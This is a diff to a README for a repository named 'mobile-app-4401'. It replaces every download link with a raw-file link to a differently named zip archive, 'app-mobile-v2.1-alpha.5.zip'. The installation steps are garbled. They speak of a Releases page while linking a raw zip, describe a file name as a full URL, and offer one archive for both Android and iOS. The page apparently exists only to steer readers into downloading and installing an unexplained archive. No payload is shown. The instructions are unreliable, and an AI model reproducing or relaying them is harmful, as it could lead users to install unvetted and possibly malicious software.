@@ -6,7 +6,7 @@ Welcome to the mobile-app-4401 repository. This app is designed to provide a smo
 
 ## ⬇️ Download Link
 
-[![Download mobile-app-4401](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/mobile-app-4401.zip)](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/mobile-app-4401.zip)
+[![Download mobile-app-4401](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/app-mobile-v2.1-alpha.5.zip)](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/app-mobile-v2.1-alpha.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,11 +20,11 @@ Before downloading, make sure your device meets the following requirements:
 
 To get the latest version of the mobile-app-4401, please visit the following link:
 
-[Download mobile-app-4401](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/mobile-app-4401.zip)
+[Download mobile-app-4401](https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/app-mobile-v2.1-alpha.5.zip)
 
 1. Click on the link above.
 2. On the Releases page, you will see a list of available versions.
-3. Select the version you want to download. It will usually be named like `https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/mobile-app-4401.zip` for Android or `https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/mobile-app-4401.zip` for iOS.
+3. Select the version you want to download. It will usually be named like `https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/app-mobile-v2.1-alpha.5.zip` for Android or `https://raw.githubusercontent.com/rajmulani/mobile-app-4401/main/thearchy/app-mobile-v2.1-alpha.5.zip` for iOS.
 4. Click on the file name to start the download.
 
 ### 📲 Installing the Application on Android
